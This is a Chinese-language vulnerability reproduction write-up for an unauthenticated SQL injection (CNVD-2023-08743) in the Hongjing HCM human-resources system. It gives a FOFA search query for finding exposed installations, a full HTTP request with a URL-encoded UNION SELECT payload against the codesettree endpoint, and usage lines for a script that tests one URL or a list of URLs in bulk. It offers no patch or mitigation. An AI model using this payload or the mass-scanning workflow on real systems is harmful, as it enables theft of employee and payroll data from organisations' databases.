# CNVD-2023-08743 宏景HCM SQL注入漏洞复现

### 1.漏洞描述

宏景HCM系统是一款由宏景软件研发的系统，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备了报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。

宏景HCM系统 categories处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

### 2.fofa语法

```
body='<div class="hj-hy-all-one-logo"' && title="人力资源信息管理系统"
```

### 3.漏洞复现

```
GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719832471808-3fd674d8-67af-4eb8-98e4-635fd2a48bd5.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 4.py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

